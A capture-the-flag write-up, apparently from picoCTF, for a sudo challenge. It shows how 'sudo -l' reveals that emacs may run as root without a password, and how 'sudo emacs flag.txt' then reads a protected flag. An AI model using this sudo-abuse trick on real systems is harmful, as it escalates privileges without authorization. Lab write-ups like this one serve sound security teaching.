# SUDO MAKE ME A SANDWICH
Number of Points: 50

## Description
Can you read the flag? I think you can!

## Hints
* What is sudo?
* How do you know what permission you have?

## Analysis & Solution
After connecting to the server, I immediately ran `ls`, which revealed `flag.txt`.

I tried reading the file,
```bash
# cat flag.txt
cat: flag.txt: Permission denied
```
I tried running sudo cat instead to use administrative privilege.
```bash
# sudo cat flag.txt
Sorry, user ctf-player is not allowed to execute '/usr/bin/cat flag.txt' as root on challenge.
```
Note that it is not a message like "ctf-player is not in the sudo file" or something like that.
It means it probably can run sudo for some command, but it is configured in a specific way.

To see what command I am allowed to run sudo on, I ran `sudo -l`.
```bash
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```
`emacs` is a text editor. Since it can run in sudo, I can probably read it by opening the file with it.

```bash
# sudo emacs flag.txt
File Edit Options Buffers Tools Text Help                                                                                                                                                         
picoCTF{REDACTED}
```
